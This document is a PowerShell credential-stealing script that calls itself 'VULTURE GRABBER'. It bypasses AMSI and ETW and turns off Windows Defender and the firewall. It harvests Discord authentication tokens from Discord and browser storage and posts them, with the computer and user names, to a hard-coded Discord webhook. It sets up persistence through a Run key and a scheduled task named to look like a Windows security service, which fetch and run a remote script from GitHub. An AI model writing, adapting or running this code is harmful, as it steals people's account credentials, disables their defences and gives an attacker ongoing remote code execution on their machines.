# === CONFIG ===
$hook = "https://discord.com/api/webhooks/1538214692596621332/kEP2XURi2kl5l6uIRgf_HEMwSZUrlujk5KHi3TxcGcfF0hyr5rbUpRI-u-94Lo6aMIhD"

# === AMSI/ETW BYPASS ===
try { 
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    if ($a) { $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
} catch {}
try {
    $etw = [Ref].Assembly.GetType('System.Management.Automation.Internal.PipelineOps')
    if ($etw) { $etw.GetField('etwEnabled','NonPublic,Static').SetValue($null,$false) }
} catch {}

# === DISABLE DEFENDER ===
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
netsh advfirewall set allprofiles state off > $null

# === STEAL TOKENS ===
$tokens = @()

# Discord LevelDB
"$env:APPDATA\Discord\Local Storage\leveldb", "$env:APPDATA\discordcanary\Local Storage\leveldb" | ForEach-Object {
    if (Test-Path $_) {
        Get-ChildItem "$_\*.log", "$_\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                [IO.File]::ReadAllText($_.FullName) | ForEach-Object {
                    [Regex]::Matches($_, '[\w-]{24}\.[\w-]{6}\.[\w-]{27}') | ForEach-Object {
                        $cleanToken = $_.Value.Trim()
                        if ($cleanToken.Length -gt 50) { $tokens += $cleanToken }
                    }
                }
            } catch {}
        }
    }
}

# Browser Local Storage
"$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
"$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb" | ForEach-Object {
    if (Test-Path $_) {
        Get-ChildItem "$_\*.log", "$_\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                [IO.File]::ReadAllText($_.FullName) | ForEach-Object {
                    [Regex]::Matches($_, '[\w-]{24}\.[\w-]{6}\.[\w-]{27}') | ForEach-Object {
                        $cleanToken = $_.Value.Trim()
                        if ($cleanToken.Length -gt 50 -and $tokens -notcontains $cleanToken) { $tokens += $cleanToken }
                    }
                }
            } catch {}
        }
    }
}

# === SCREENSHOT ===
Add-Type -AssemblyName System.Windows.Forms
$bmp = New-Object Drawing.Bitmap([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
[Drawing.Graphics]::FromImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size)
$ms = New-Object IO.MemoryStream
$bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Png)
$bytes = $ms.ToArray()
$ms.Close()

# === SEND TOKENS AS FILE (FIXED METHOD) ===
$uniqueTokens = @($tokens | Sort-Object -Unique)
$tokenContent = ($uniqueTokens -join "`n") + "`n"

# Create properly formatted multipart body
$boundary = "----VultureBoundary" + (Get-Random).ToString()
$LF = "`r`n"

# JSON payload first
$jsonPayload = @{
    content = "**[VULTURE GRABBER]**`nPC: $env:COMPUTERNAME`nUser: $env:USERNAME`nTokens Found: $($uniqueTokens.Count)"
} | ConvertTo-Json -Compress

$body = (
    "--$boundary$LF" +
    "Content-Disposition: form-data; name=`"payload_json`"$LF" +
    "Content-Type: application/json$LF$LF" +
    "$jsonPayload$LF" +
    "--$boundary$LF" +
    "Content-Disposition: form-data; name=`"file`; filename=`"tokens.txt`"$LF" +
    "Content-Type: text/plain$LF$LF" +
    "$tokenContent$LF" +
    "--$boundary--$LF"
)

# Send request
try {
    $response = Invoke-RestMethod -Uri $hook -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
} catch {
    # Fallback: send tokens in message if file fails
    $fallbackContent = "**[VULTURE GRABBER]**`nPC: $env:COMPUTERNAME`nUser: $env:USERNAME`nTokens Found: $($uniqueTokens.Count)`n`n" + ($uniqueTokens -join "`n")
    try { Invoke-RestMethod -Uri $hook -Method Post -Body @{content=$fallbackContent} } catch {}
}

# === PERSISTENCE ===
$cmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command `"iex(irm 'https://raw.githubusercontent.com/saksham123107-pixel/son/main/son.ps1')`""
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -Value $cmd -ErrorAction SilentlyContinue
schtasks /create /tn "WindowsSecurityHealth" /tr "$cmd" /sc onlogon /f /rl highest /it > $null 2>&1
